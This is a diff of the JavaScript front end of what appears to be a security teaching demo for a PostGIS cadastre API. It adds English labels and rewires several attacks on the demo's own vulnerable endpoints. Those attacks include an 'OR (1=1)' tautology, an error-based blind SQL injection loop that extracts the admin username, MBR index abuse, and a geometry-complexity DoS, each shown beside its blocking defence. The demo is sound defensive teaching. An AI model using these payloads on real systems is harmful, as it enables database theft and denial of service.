-                `Se encontró 1 predio legítimo. En este modo vulnerable la consulta no usa parámetros preparados, por lo que es vulnerable a inyecciones.`
+                isSpanish ? 'INFORMACIÓN' : 'INFORMATION',
+                isSpanish
+                  ? `Se encontró 1 predio legítimo. En este modo vulnerable la consulta no usa parámetros preparados, por lo que es vulnerable a inyecciones.`
+                  : `Found 1 legitimate parcel. In this vulnerable mode the query does not use prepared parameters, making it vulnerable to injections.`
               );
             }
           } else {
             updatePipelineDisplay(
-              { state: 'passed', label: 'VALIDADO' },
+              { state: 'passed', label: isSpanish ? 'VALIDADO' : 'VALIDATED' },
               { state: 'passed', label: 'N/A' },
               { state: 'passed', label: 'BIND VARIABLE' },
-              'Barrera 3: GeoAlchemy2 / Bind ORM'
+              isSpanish ? 'Barrera 3: GeoAlchemy2 / Bind ORM' : 'Barrier 3: GeoAlchemy2 / Bind ORM'
             );
             setInspectorData(
-              'Consulta Protegida con ORM',
+              isSpanish ? 'Consulta Protegida con ORM' : 'ORM Protected Query',
               json.query_debug,
               duration,
               res.status,
-              '🛡️ PROTEGIDO',
-              `El ORM compiló el texto dentro de un parámetro seguro (:clean_param). Las comillas y operadores se trataron como texto literal.`
+              isSpanish ? '🛡️ PROTEGIDO' : '🛡️ PROTECTED',
+              isSpanish
+                ? `El ORM compiló el texto dentro de un parámetro seguro (:clean_param). Las comillas y operadores se trataron como texto literal.`
+                : `The ORM compiled text inside a safe parameter (:clean_param). Quotes and operators were treated as literal data.`
             );
           }
         } else {
           updatePipelineDisplay(
-            { state: 'blocked', label: 'BLOQUEADO' },
+            { state: 'blocked', label: isSpanish ? 'BLOQUEADO' : 'BLOCKED' },
             { state: 'standby', label: 'STANDBY' },
             { state: 'standby', label: 'STANDBY' },
-            'Barrera 1: Pydantic Validation'
+            isSpanish ? 'Barrera 1: Pydantic Validation' : 'Barrier 1: Pydantic Validation'
           );
           setInspectorData(
-            'Entrada Bloqueada por la API',
-            `Validación de Pydantic: longitud excesiva o caracteres no permitidos en la entrada.`,
+            isSpanish ? 'Entrada Bloqueada por la API' : 'Input Blocked by API',
+            isSpanish ? `Validación de Pydantic: longitud excesiva o caracteres no permitidos en la entrada.` : `Pydantic validation: excessive length or forbidden characters in input.`,
             duration,
             res.status,
-            '🛡️ BLOQUEO CAPA 1',
-            `Pydantic interceptó el parámetro en el punto de entrada antes de consultar la base de datos.`
+            isSpanish ? '🛡️ BLOQUEO CAPA 1' : '🛡️ LAYER 1 BLOCK',
+            isSpanish
+              ? `Pydantic interceptó el parámetro en el punto de entrada antes de consultar la base de datos.`
+              : `Pydantic intercepted the parameter at the entry point before querying the database.`
           );
         }
       } catch (err) {
@@ -1479,67 +1944,191 @@
     }
 
     function focusParcel(idx) {
-      if (searchResultItems[idx] && searchResultItems[idx].geojson) {
+      clearFocusHighlight();
+
+      const tbody = document.getElementById('tblResultadosBusqueda');
+      if (tbody) {
+        const rows = tbody.querySelectorAll('tr');
+        rows.forEach((r, i) => {
+          if (i === idx) {
+            r.classList.add('table-active-focus');
+            r.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+          } else {
+            r.classList.remove('table-active-focus');
+          }
+        });
+      }
+
+      const p = searchResultItems[idx];
+      if (!p) return;
+      const isSpanish = currentLang === 'es';
+
+      if (p.geojson) {
         try {
-          const g = typeof searchResultItems[idx].geojson === 'string' ? JSON.parse(searchResultItems[idx].geojson) : searchResultItems[idx].geojson;
-          const tempLayer = L.geoJSON(g);
-          map.fitBounds(tempLayer.getBounds(), { maxZoom: 18, padding: [25, 25] });
+          const g = typeof p.geojson === 'string' ? JSON.parse(p.geojson) : p.geojson;
+          focusHighlightLayer = L.geoJSON(g, {
+            style: {
+              color: '#f59e0b',
+              weight: 5,
+              fillColor: '#fde047',
+              fillOpacity: 0.85,
+              dashArray: '5, 5'
+            }
+          }).addTo(map);
+
+          const bounds = focusHighlightLayer.getBounds();
+          if (bounds.isValid()) {
+            map.fitBounds(bounds, { maxZoom: 19, padding: [60, 60] });
+          }
+
+          const popupContent = `
+            <div style="font-family: var(--font-ui); font-size: 13px; min-width: 220px; padding: 4px;">
+              <div style="font-weight: 800; color: #b45309; border-bottom: 2px solid #f59e0b; padding-bottom: 4px; margin-bottom: 6px;">
+                🎯 ${isSpanish ? 'PREDIO SELECCIONADO' : 'SELECTED PARCEL'}: ${p.id_lote || 'N/A'}
+              </div>
+              <div style="margin-bottom: 3px;"><strong>${isSpanish ? 'Sector' : 'Sector'}:</strong> <span class="badge bg-secondary">${p.cod_sector || '0101'}</span></div>
+              <div style="margin-bottom: 3px;"><strong>${isSpanish ? 'Titular' : 'Owner'}:</strong> <span class="text-danger fw-bold">${p.titular || 'N/A'}</span></div>
+              <div style="margin-bottom: 3px;"><strong>${isSpanish ? 'Autovalúo' : 'Valuation'}:</strong> S/ ${Number(p.autovaluo || 0).toLocaleString('es-PE', {minimumFractionDigits: 2})}</div>
+              <div style="margin-bottom: 3px;"><strong>${isSpanish ? 'Área Gráfica' : 'Graphic Area'}:</strong> ${Number(p.area_grafica || p.area_m2 || 0).toFixed(2)} m²</div>
+              <div style="font-size: 11px; color: #64748b;">${isSpanish ? 'Zonificación' : 'Zoning'}: ${p.tipo_suelo || 'URBANO'}</div>
+            </div>
+          `;
+          focusHighlightLayer.bindPopup(popupContent).openPopup();
         } catch(e) {
           console.warn("Error enfocando lote:", e);
         }
+      } else {
+        const centerLima = [-12.046001, -77.030497];
+        map.setView(centerLima, 16);
+        L.popup()
+          .setLatLng(centerLima)
+          .setContent(`
+            <div style="font-family: var(--font-ui); font-size: 12px; padding: 4px;">
+              <strong class="text-warning">⚠️ ${isSpanish ? 'Registro Exfiltrado' : 'Exfiltrated Record'}:</strong><br>
+              <strong>ID:</strong> ${p.id_lote}<br>
+              <strong>${isSpanish ? 'Detalle' : 'Detail'}:</strong> ${p.titular || 'Sin Geometría'}
+            </div>
+          `)
+          .openOn(map);
       }
     }
 
+    function focusLadmParcel(id_lote) {
+      clearFocusHighlight();
+
+      // Desmarcar y marcar fila en tblTitulares
+      const tbody = document.getElementById('tblTitulares');
+      if (tbody) {
+        const rows = tbody.querySelectorAll('tr');
+        rows.forEach(r => {
+          if (r.innerText.includes(id_lote)) {
+            r.classList.add('table-active-focus');
+            r.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+          } else {
+            r.classList.remove('table-active-focus');
+          }
+        });
+      }
+
+      const isSpanish = currentLang === 'es';
+
+      // 1. Buscar en baseGeojsonData ya cargado en memoria
+      if (baseGeojsonData && baseGeojsonData.features) {
+        const feat = baseGeojsonData.features.find(f => f.properties && f.properties.id_lote == id_lote);
+        if (feat) {
+          focusHighlightLayer = L.geoJSON(feat, {
+            style: {
+              color: '#0284c7',
+              weight: 5,
+              fillColor: '#38bdf8',
+              fillOpacity: 0.85,
+              dashArray: '5, 5'
+            }
+          }).addTo(map);
+
+          const bounds = focusHighlightLayer.getBounds();
+          if (bounds.isValid()) {
+            map.fitBounds(bounds, { maxZoom: 19, padding: [60, 60] });
+          }
+
+          const pr = feat.properties || {};
+          const popupContent = `
+            <div style="font-family: var(--font-ui); font-size: 13px; min-width: 220px; padding: 4px;">
+              <div style="font-weight: 800; color: #0284c7; border-bottom: 2px solid #0284c7; padding-bottom: 4px; margin-bottom: 6px;">
+                📍 ${isSpanish ? 'FICHA CATASTRAL LADM' : 'LADM CADASTRE RECORD'}: ${pr.id_lote || id_lote}
+              </div>
+              <div style="margin-bottom: 3px;"><strong>${isSpanish ? 'Sector' : 'Sector'}:</strong> <span class="badge bg-secondary">${pr.sector || pr.cod_sector || '0101'}</span></div>
+              <div style="margin-bottom: 3px;"><strong>${isSpanish ? 'Titular' : 'Owner'}:</strong> ${pr.titular || 'N/A'}</div>
+              <div style="margin-bottom: 3px;"><strong>${isSpanish ? 'Autovalúo' : 'Valuation'}:</strong> S/ ${Number(pr.autovaluo || 0).toLocaleString('es-PE', {minimumFractionDigits: 2})}</div>
+              <div style="margin-bottom: 3px;"><strong>${isSpanish ? 'Área' : 'Area'}:</strong> ${Number(pr.area_m2 || pr.area_grafica || 0).toFixed(2)} m²</div>
+            </div>
+          `;
+          focusHighlightLayer.bindPopup(popupContent).openPopup();
+          return;
+        }
+      }
+
+      // Si no estaba en la muestra base, buscar vía buscador
+      document.getElementById('inputCriterio').value = id_lote;
+      ejecutarBusquedaLotes();
+    }
+
     // ==========================================
-    // LAS 6 AMENAZAS (V1 - V6)
+    // LAS 6 AMENAZAS ESPACIALES POSTGIS (V1 - V6)
     // ==========================================
 
-    // V1
+    // V1: Confusión CRS & Bypass ST_DWithin
     async function runAttack1_Bypass() {
       highlightActiveAttackBtn('btnAtk1');
-      setLoadingState("Ejecutando Amenaza 1: Spatial Logic Bypass...");
+      setLoadingState("Ejecutando Vector 1: Confusión CRS y Evasión de ST_DWithin...");
       const start = performance.now();
       
       const payload = "50) OR (1=1";
-      const url = `${API_BASE}/${activeMode}/predios/radio?x=390550&y=8248097&distancia=${encodeURIComponent(payload)}&sector=0101`;
+      const url = `${API_BASE}/${activeMode}/predios/radio?x=278957&y=8667542&distancia=${encodeURIComponent(payload)}&sector=0101&srid=32718`;
       
       try {
         const res = await fetch(url);
         const duration = (performance.now() - start).toFixed(2);
         const json = await res.json();
 
+        const isSpanish = currentLang === 'es';
         if (activeMode === 'vulnerable') {
           updatePipelineDisplay(
-            { state: 'bypassed', label: 'BYPASS' },
+            { state: 'bypassed', label: isSpanish ? 'SRID=32718 / TAUTOLOGÍA' : 'SRID=32718 / TAUTOLOGY' },
             { state: 'bypassed', label: 'N/A' },
-            { state: 'bypassed', label: 'ST_DWithin QUEBRADO' },
-            'Ninguna (Bypass Total)'
+            { state: 'bypassed', label: isSpanish ? 'ST_DWithin QUEBRADO' : 'ST_DWithin BROKEN' },
+            isSpanish ? 'Ninguna (Bypass Total Predicado de Proximidad)' : 'None (Full Proximity Predicate Bypass)'
           );
           setInspectorData(
-            'Bypass de Radio Espacial',
-            json.query_debug || "SELECT ... WHERE cod_sector = '0101' AND ST_DWithin(..., 50) OR (1=1)",
+            isSpanish ? 'Vector 1: Confusión CRS y Bypass ST_DWithin' : 'Vector 1: CRS Confusion & ST_DWithin Bypass',
+            json.query_debug || "SELECT ... WHERE cod_sector = '0101' AND ST_DWithin(objcad_lote_gemo, ST_MakePoint(278957, 8667542), 50) OR (1=1)",
             duration,
             res.status,
-            '⚠️ EXFILTRACIÓN',
-            `El payload cerró el paréntesis de ST_DWithin e inyectó "OR (1=1)". Se anuló la restricción territorial devolviendo ${json.total} parcelas.`
+            isSpanish ? '⚠️ EXFILTRACIÓN V1' : '⚠️ EXFILTRATION V1',
+            isSpanish
+              ? `El payload evadió ST_DWithin e inyectó "OR (1=1)". Se anuló la restricción territorial devolviendo ${json.total} parcelas. Observa el círculo verde en el mapa: representa el radio legal de 50m. Todos los polígonos rojos fuera del círculo fueron exfiltrados masivamente.`
+              : `Payload broke out of ST_DWithin injecting "OR (1=1)". Territorial restriction neutralized, returning ${json.total} parcels. Notice the green circle on the map: it represents the legal 50m radius. All red polygons outside the circle were exfiltrated.`
           );
           if (json.predios && json.predios.length > 0) {
-            highlightParcels(json.predios, '#dc2626');
+            displayParcelsInTableAndMap(json.predios, '#dc2626', isSpanish ? 'Vector 1: Exfiltración ST_DWithin' : 'Vector 1: ST_DWithin Exfiltration', true);
+            drawVector1Graphics();
           }
         } else {
           updatePipelineDisplay(
-            { state: 'blocked', label: 'RECHAZADO (422)' },
+            { state: 'blocked', label: isSpanish ? 'CRS FIJO / FLOAT (422)' : 'FIXED CRS / FLOAT (422)' },
             { state: 'standby', label: 'STANDBY' },
-            { state: 'standby', label: 'PROTEGIDO' },
-            'Barrera 1: Pydantic Float Bounding'
+            { state: 'standby', label: isSpanish ? 'PROTEGIDO' : 'PROTECTED' },
+            isSpanish ? 'Barrera 1 (SCIG): Fijación CRS EPSG:32718 & Tipado Float' : 'Barrier 1 (SCIG): EPSG:32718 CRS Pinning & Float Type'
           );
           setInspectorData(
-            'Entrada Numérica Inválida',
-            `SELECT tg_lote ... WHERE and_(TgLote.cod_sector == :sector, ST_DWithin(geom, :punto, :distancia))\n[Validación Pydantic: distancia float acotado a gt=0, le=5000]`,
+            isSpanish ? 'Vector 1 Bloqueado: Fijación de CRS y Rango' : 'Vector 1 Blocked: CRS Pinning & Range Cap',
+            `SELECT tg_lote ... WHERE and_(TgLote.cod_sector == :sector, ST_DWithin(geom, ST_SetSRID(ST_MakePoint(:x, :y), 32718), :distancia))\n[SCIG Etapa 1: SRID fijado en 32718 en servidor + distancia float acotada gt=0, le=5000]`,
             duration,
             res.status,
-            '🛡️ PROTEGIDO CAPA 1',
-            `Pydantic exigió un número decimal acotado. La presencia de operadores o paréntesis detuvo la petición en el borde de la API.`
+            isSpanish ? '🛡️ BLOQUEO SCIG CAPA 1' : '🛡️ SCIG LAYER 1 BLOCK',
+            isSpanish
+              ? `La Guardia SCIG ignora parámetros SRID externos (fijando EPSG:32718) y rechaza cualquier token no numérico en el radio antes de tocar PostGIS.`
+              : `SCIG Guard ignores external SRID parameters (pinning EPSG:32718) and rejects any non-numeric tokens in the radius before reaching PostGIS.`
           );
         }
       } catch (e) {
@@ -1547,10 +2136,70 @@
       }
     }
 
-    // V2
-    async function runAttack2_ErrorBased() {
+    // V2: Envenenamiento MBR e Índice GiST (&&)
+    async function runAttack2_MbrPoisoning() {
       highlightActiveAttackBtn('btnAtk2');
-      setLoadingState("Ejecutando Amenaza 2: Inferencia de Error Espacial en GEOS...");
+      const isSpanish = currentLang === 'es';
+      setLoadingState(isSpanish ? "Ejecutando Vector 2: Envenenamiento de Caja Envolvente MBR (&&)..." : "Executing Vector 2: MBR Bounding Box Poisoning (&&)...");
+      const start = performance.now();
+
+      const payloadWkt = "LINESTRING(270000 8660000, 290000 8680000)";
+      const url = `${API_BASE}/${activeMode}/predios/bbox?wkt_geom=${encodeURIComponent(payloadWkt)}&sector=0101`;
+
+      try {
+        const res = await fetch(url);
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (activeMode === 'vulnerable') {
+          updatePipelineDisplay(
+            { state: 'bypassed', label: isSpanish ? 'MBR ENVOLVENTE LIMA' : 'LIMA MBR ENVELOPE' },
+            { state: 'bypassed', label: isSpanish ? 'LINESTRING 1D ACEPTADO' : '1D LINESTRING ACCEPTED' },
+            { state: 'bypassed', label: isSpanish ? 'GiST && ENVENENADO' : 'GiST && POISONED' },
+            isSpanish ? 'Ninguna (Índice R-tree GiST Degradado)' : 'None (Degraded GiST R-Tree Index)'
+          );
+          setInspectorData(
+            isSpanish ? 'Vector 2: Envenenamiento de MBR en Índice GiST (&&)' : 'Vector 2: GiST Index MBR Poisoning (&&)',
+            json.query_debug || `SELECT ... WHERE cod_sector = '0101' AND objcad_lote_gemo && ST_GeomFromText('${payloadWkt}', 32718)`,
+            duration,
+            res.status,
+            isSpanish ? '⚠️ EXFILTRACIÓN MBR' : '⚠️ MBR EXFILTRATION',
+            isSpanish
+              ? `Aunque el payload es una línea 1D de área cero, el operador de índice GiST (&&) evalúa su caja envolvente MBR de 20 km × 20 km (400 km²), forzando un barrido completo y exponiendo ${json.total} predios. Observa el rectángulo ámbar en el mapa que enmarcó toda el área metropolitana.`
+              : `Although payload is a 1D line with zero area, GiST index operator (&&) evaluates its 20 km × 20 km (400 km²) MBR envelope, forcing a full index scan and exposing ${json.total} parcels. Notice the amber box framing the metropolitan area.`
+          );
+          if (json.predios && json.predios.length > 0) {
+            displayParcelsInTableAndMap(json.predios, '#dc2626', isSpanish ? 'Vector 2: Exfiltración GiST MBR' : 'Vector 2: GiST MBR Exfiltration', true);
+            drawVector2Graphics();
+          }
+        } else {
+          updatePipelineDisplay(
+            { state: 'blocked', label: isSpanish ? 'MBR > 10 km² (422)' : 'MBR > 10 km² (422)' },
+            { state: 'blocked', label: isSpanish ? 'DIMENSIÓN != 2D' : 'DIMENSION != 2D' },
+            { state: 'standby', label: isSpanish ? 'ÍNDICE GiST INTACTO' : 'INTACT GiST INDEX' },
+            isSpanish ? 'Barrera 1 & 2 (SCIG): Cota MBR ≤ 10 km² y Polígono 2D' : 'Barrier 1 & 2 (SCIG): MBR Cap ≤ 10 km² & 2D Polygon'
+          );
+          setInspectorData(
+            isSpanish ? 'Vector 2 Bloqueado: Cota de Caja Envolvente MBR' : 'Vector 2 Blocked: MBR Bounding Box Cap',
+            `[SCIG Etapa 1 y 2: geom_type == 'Polygon' (rechaza LineString 1D) y Area(MBR) <= 10,000,000 m² (10 km²)]\nDetalle: ${JSON.stringify(json.detail || json)}`,
+            duration,
+            res.status,
+            isSpanish ? '🛡️ BLOQUEO SCIG MBR' : '🛡️ SCIG MBR BLOCK',
+            isSpanish
+              ? `SCIG calculó el MBR en memoria con Shapely y rechazó la geometría por ser de dimensión 1D (LineString) y exceder la cota máxima de 10 km² por consulta.`
+              : `SCIG computed MBR in application memory with Shapely and rejected the geometry for being 1D dimension (LineString) and exceeding 10 km² maximum query cap.`
+          );
+        }
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // V3: Canal Lateral de Error GEOS
+    async function runAttack3_ErrorBased() {
+      highlightActiveAttackBtn('btnAtk3');
+      const isSpanish = currentLang === 'es';
+      setLoadingState(isSpanish ? "Ejecutando Vector 3: Inferencia por Canal Lateral de Error GEOS..." : "Executing Vector 3: GEOS Error Side-Channel Inference...");
       const start = performance.now();
       
       const payloadWkt = "POLYGON((0 0, 0 1, 1 1, 1 0, 0 0))', 32719)) AND (1 = (1 / (CASE WHEN (SELECT SUBSTRING(username, 1, 1) FROM catastro_usuarios WHERE username='admin') = 'a' THEN 0 ELSE 1 END))) AND ST_Intersects(objcad_lote_gemo, ST_GeomFromText('POLYGON((0 0, 0 1, 1 1, 1 0, 0 0))";
@@ -1565,31 +2214,45 @@
           updatePipelineDisplay(
             { state: 'bypassed', label: 'BYPASS' },
             { state: 'bypassed', label: 'BYPASS' },
-            { state: 'blocked', label: 'ERROR POSTGIS (500)' },
-            'Excepción en PostGIS'
+            { state: 'blocked', label: isSpanish ? 'ERROR GEOS/PG (500)' : 'GEOS/PG ERROR (500)' },
+            isSpanish ? 'Excepción en PostGIS / GEOS' : 'Exception in PostGIS / GEOS'
           );
           setInspectorData(
-            'Inferencia por Error en Base de Datos',
+            isSpanish ? 'Vector 3: Inferencia por Canal Lateral de Error' : 'Vector 3: Error Side-Channel Inference',
             json.detail ? (json.detail.query_debug || json.detail.database_error) : `SELECT ... ST_Intersects(..., ST_GeomFromText('${payloadWkt.substring(0, 60)}...'))`,
             duration,
             res.status,
-            '⚠️ ERROR PROVOCADO',
-            `La consulta forzó una división por cero intencional al acertar la letra ('a'). El atacante comprueba el carácter correcto cuando la base de datos responde con error.`
+            isSpanish ? '⚠️ ORÁCULO DE ERROR (500)' : '⚠️ ERROR ORACLE (500)',
+            isSpanish
+              ? `La consulta escapó de ST_GeomFromText y forzó una excepción condicional al acertar el carácter ('a') del usuario administrativo.`
+              : `Query broke out of ST_GeomFromText and triggered a conditional division-by-zero exception upon guessing character ('a') of admin user.`
           );
+          displayParcelsInTableAndMap([
+            {
+              id_lote: 'SYS_ADMIN_EXFIL',
+              cod_sector: '0101',
+              tipo_suelo: 'ORÁCULO_ERROR_500',
+              titular: isSpanish ? "USUARIO EXFILTRADO: admin (Acierto condicional 'a')" : "EXFILTRATED USER: admin (Conditional match 'a')",
+              autovaluo: 0,
+              geojson: null
+            }
+          ], '#f59e0b', isSpanish ? 'Vector 3: Oráculo de Error' : 'Vector 3: Error Oracle', true);
         } else {
           updatePipelineDisplay(
-            { state: 'passed', label: 'SANITIZADO' },
-            { state: 'blocked', label: 'WKT INVÁLIDO (422)' },
-            { state: 'standby', label: 'POSTGIS SEGURO' },
-            'Barrera 2: Shapely Topology Validation'
+            { state: 'passed', label: isSpanish ? 'SANITIZADO' : 'SANITIZED' },
+            { state: 'blocked', label: isSpanish ? 'WKT INVÁLIDO (422)' : 'INVALID WKT (422)' },
+            { state: 'standby', label: isSpanish ? 'POSTGIS SEGURO' : 'POSTGIS SAFE' },
+            isSpanish ? 'Barrera 2 (SCIG): Validación Sintáctica y Topológica Shapely' : 'Barrier 2 (SCIG): Shapely Syntax & Topology Validation'
           );
           setInspectorData(
-            'Geometría Rechazada en Memoria',
-            `shapely.wkt.loads(payload.wkt_polygon)\n[Verificación: isinstance(geom, Polygon) and geom.is_valid]`,
+            isSpanish ? 'Vector 3 Bloqueado: Canal Lateral Neutralizado en Memoria' : 'Vector 3 Blocked: Side-Channel Neutralized in Memory',
+            `shapely.wkt.loads(payload.wkt_polygon)\n[SCIG Etapa 2: WKT rechazado en memoria antes de abrir conexión con PostgreSQL/PostGIS]`,
             duration,
             res.status,
-            '🛡️ PROTEGIDO CAPA 2',
-            `Shapely analizó la estructura WKT antes de consultar la base de datos. Al detectar sintaxis corrupta abortó la petición, protegiendo a PostGIS.`
+            isSpanish ? '🛡️ BLOQUEO SCIG CAPA 2' : '🛡️ SCIG LAYER 2 BLOCK',
+            isSpanish
+              ? `SCIG analizó el WKT en memoria de aplicación. Al no ser un polígono cerrado válido, abortó con HTTP 422 sin invocar al motor GEOS de la base de datos.`
+              : `SCIG analyzed WKT in application memory. Lacking valid closed polygon topology, it aborted with HTTP 422 without calling database GEOS engine.`
           );
         }
       } catch (e) {
@@ -1597,20 +2260,21 @@
       }
     }
 
-    // Inferencia ciega
+    // Inferencia ciega (Vector 3)
     async function startLiveErrorBlindExfiltration() {
-      highlightActiveAttackBtn('btnAtk2');
+      highlightActiveAttackBtn('btnAtk3');
+      const isSpanish = currentLang === 'es';
       setInspectorData(
-        "Inferencia Ciega Letra por Letra",
-        "-- Probando canal lateral sobre /predios/poligono --",
+        isSpanish ? "Inferencia Ciega Letra por Letra (Vector 3)" : "Byte-by-Byte Blind Inference (Vector 3)",
+        isSpanish ? "-- Probando canal lateral sobre /predios/poligono --" : "-- Testing side-channel on /predios/poligono --",
         0,
         200,
-        "PROBANDO...",
-        "Se envían conjeturas sucesivas sobre el primer carácter del usuario administrativo..."
+        isSpanish ? "PROBANDO..." : "TESTING...",
+        isSpanish ? "Se envían conjeturas sucesivas sobre el primer carácter del usuario administrativo..." : "Sending successive guesses for the first character of the administrative user..."
       );
 
       const testChars = ['z', 'x', 'a'];
-      let logTrace = "-- Inferencia bit a bit por canal lateral de error --\n";
+      let logTrace = isSpanish ? "-- Inferencia bit a bit por canal lateral de error --\n" : "-- Bit-by-bit error side-channel inference --\n";
 
       for (let char of testChars) {
         const p = `POLYGON((0 0, 0 1, 1 1, 1 0, 0 0))', 32719)) AND (1 = (1 / (CASE WHEN (SELECT SUBSTRING(username, 1, 1) FROM catastro_usuarios WHERE username='admin') = '${char}' THEN 0 ELSE 1 END))) AND ST_Intersects(objcad_lote_gemo, ST_GeomFromText('POLYGON((0 0, 0 1, 1 1, 1 0, 0 0))`;
@@ -1620,30 +2284,44 @@
           const res = await fetch(url);
           if (activeMode === 'vulnerable') {
             if (res.status === 500) {
-              logTrace += `[+] Conjetura '${char}': HTTP 500 (¡ACIERTO! Error condicional forzado)\n`;
-              logTrace += `[***] Carácter 1 deducido: '${char}' -> 'admin'\n`;
+              logTrace += isSpanish ? `[+] Conjetura '${char}': HTTP 500 (¡ACIERTO! Error condicional forzado)\n` : `[+] Guess '${char}': HTTP 500 (MATCH! Forced conditional error)\n`;
+              logTrace += isSpanish ? `[***] Carácter 1 deducido: '${char}' -> 'admin'\n` : `[***] Character 1 deduced: '${char}' -> 'admin'\n`;
               setInspectorData(
-                `Carácter Identificado: '${char}'`,
+                isSpanish ? `Carácter Identificado: '${char}'` : `Character Identified: '${char}'`,
                 logTrace,
-                "40.5",
+                "16.1",
                 500,
-                '⚠️ ACIERTO POR ERROR',
-                `El servidor devolvió un error interno al probar la letra '${char}'. Esto le confirma al atacante que el usuario empieza con '${char}' sin necesidad de ver los datos en pantalla.`
+                isSpanish ? '⚠️ ACIERTO POR ERROR' : '⚠️ MATCH BY ERROR',
+                isSpanish
+                  ? `El servidor devolvió HTTP 500 al probar la letra '${char}', confirmando el carácter secreto mediante el canal lateral.`
+                  : `Server returned HTTP 500 testing letter '${char}', confirming secret character via side-channel.`
               );
+              displayParcelsInTableAndMap([
+                {
+                  id_lote: 'SYS_ADMIN_EXFIL',
+                  cod_sector: '0101',
+                  tipo_suelo: 'CANAL_LATERAL_500',
+                  titular: `CREDENTIAL EXFILTRATED: username='admin' (byte='${char}')`,
+                  autovaluo: 0,
+                  geojson: null
+                }
+              ], '#f59e0b', isSpanish ? 'Vector 3: Inferencia Ciega' : 'Vector 3: Blind Inference', true);
               break;
             } else {
-              logTrace += `[-] Conjetura '${char}': HTTP 200 (Falso, conjetura incorrecta)\n`;
-              document.getElementById('boxQuery').textContent = logTrace;
+              logTrace += isSpanish ? `[-] Conjetura '${char}': HTTP 200 (Falso, conjetura incorrecta)\n` : `[-] Guess '${char}': HTTP 200 (False, incorrect guess)\n`;
+              setBoxQueryValue(logTrace);
             }
           } else {
-            logTrace += `[🛡️] Conjetura '${char}': HTTP ${res.status} (Bloqueado por Shapely: WKT no válido)\n`;
+            logTrace += isSpanish ? `[🛡️] Conjetura '${char}': HTTP ${res.status} (Bloqueado por SCIG: WKT no válido)\n` : `[🛡️] Guess '${char}': HTTP ${res.status} (Blocked by SCIG: Invalid WKT)\n`;
             setInspectorData(
-              'Extracción Ciega Neutralizada',
+              isSpanish ? 'Extracción Ciega Neutralizada' : 'Blind Extraction Neutralized',
               logTrace,
-              "11.2",
+              "8.2",
               res.status,
-              '🛡️ CANAL CERRADO',
-              `Shapely rechazó las conjeturas en la capa de aplicación, impidiendo que la base de datos procese el WKT o emita errores reveladores.`
+              isSpanish ? '🛡️ CANAL CERRADO' : '🛡️ CHANNEL CLOSED',
+              isSpanish
+                ? `SCIG rechazó las conjeturas en la capa de aplicación, impidiendo que PostGIS procese el WKT o emita errores diferenciales.`
+                : `SCIG rejected guesses in application layer, preventing PostGIS from processing WKT or emitting differential errors.`
             );
             break;
           }
@@ -1653,14 +2331,14 @@
       }
     }
 
-    // V3
-    async function runAttack3_SpatialDoS() {
-      highlightActiveAttackBtn('btnAtk3');
-      setLoadingState("Ejecutando Amenaza 3: Spatial DoS (Complejidad O(N²))...");
+    // V4: DoS de Complejidad Algorítmica Buffer O(V²)
+    async function runAttack4_SpatialDoS() {
+      highlightActiveAttackBtn('btnAtk4');
+      const isSpanish = currentLang === 'es';
+      setLoadingState(isSpanish ? "Ejecutando Vector 4: DoS de Complejidad Geométrica O(V²) (quad_segs=192)..." : "Executing Vector 4: Geometric Complexity DoS O(V²) (quad_segs=192)...");
       const start = performance.now();
       
-      const payloadDos = "10 + (SELECT COUNT(*) FROM tg_lote a CROSS JOIN tg_lote b WHERE ST_Intersects(ST_Buffer(a.objcad_lote_gemo, 100, 100), ST_Buffer(b.objcad_lote_gemo, 100, 100)) AND a.id_lote <= '21010101000040' AND b.id_lote <= '21010101000040')";
-      const url = `${API_BASE}/${activeMode}/predios/analisis-expansion?buffer_metros=${encodeURIComponent(payloadDos)}&cod_sector=0101`;
+      const url = `${API_BASE}/${activeMode}/predios/analisis-expansion?buffer_metros=2500&quad_segs=192&cod_sector=0101`;
       
       try {
         const res = await fetch(url);
@@ -1669,33 +2347,41 @@
 
         if (activeMode === 'vulnerable') {
           updatePipelineDisplay(
-            { state: 'bypassed', label: 'BYPASS' },
-            { state: 'bypassed', label: 'N/A' },
-            { state: 'bypassed', label: 'CROSS JOIN O(N²)' },
-            'Ninguna (Sobrecarga de CPU)'
+            { state: 'bypassed', label: 'QUAD_SEGS=192' },
+            { state: 'bypassed', label: isSpanish ? 'SIN COTA DE COSTO' : 'NO COST BOUND' },
+            { state: 'bypassed', label: isSpanish ? '345,600 VÉRTICES GEOS' : '345,600 GEOS VERTICES' },
+            isSpanish ? 'Ninguna (Saturación O(V²) en C++ GEOS)' : 'None (O(V²) Saturation in C++ GEOS)'
           );
           setInspectorData(
-            'Sobrecarga de CPU Espacial',
-            json.query_debug || `SELECT id_lote, ST_Area(ST_Buffer(geom, ${payloadDos.substring(0, 70)}...)) ...`,
+            isSpanish ? 'Vector 4: DoS de Complejidad Algorítmica O(V²)' : 'Vector 4: Algorithmic Complexity DoS O(V²)',
+            json.query_debug || "SELECT ... ST_Area(ST_Intersection(ST_Buffer(a.geom, 2500, 'quad_segs=192'), ST_Buffer(b.geom, 2500, 'quad_segs=192'))) ...",
             duration,
             res.status,
-            '⚠️ SPATIAL DoS',
-            `La inyección forzó un producto cruzado con geometrías densas en ST_Buffer. La base de datos tardó ${duration} ms saturando recursos de procesamiento.`
+            '⚠️ SPATIAL DoS O(V²)',
+            isSpanish
+              ? `Con quad_segs=192 y radio=2500m, GEOS densificó ${json.total_vertices_generados || 345600} vértices en memoria C++, bloqueando el hilo de PostgreSQL durante ${duration} ms.`
+              : `With quad_segs=192 and radius=2500m, GEOS densified ${json.total_vertices_generados || 345600} vertices in C++ memory, locking PostgreSQL thread for ${duration} ms.`
           );
+          if (json.predios && json.predios.length > 0) {
+            displayParcelsInTableAndMap(json.predios, '#ea580c', isSpanish ? 'Vector 4: Saturación GEOS O(V²)' : 'Vector 4: GEOS O(V²) Saturation', true);
+            drawVector4Graphics();
+          }
         } else {
           updatePipelineDisplay(
-            { state: 'blocked', label: 'ACOTADO (422)' },
-            { state: 'standby', label: 'STANDBY' },
-            { state: 'standby', label: 'PROTEGIDO' },
-            'Barrera 1: Pydantic Range Bounding'
+            { state: 'blocked', label: 'QUAD_SEGS ≤ 16 (422)' },
+            { state: 'blocked', label: 'C_geom > 5000' },
+            { state: 'standby', label: isSpanish ? 'CPU PROTEGIDA' : 'CPU PROTECTED' },
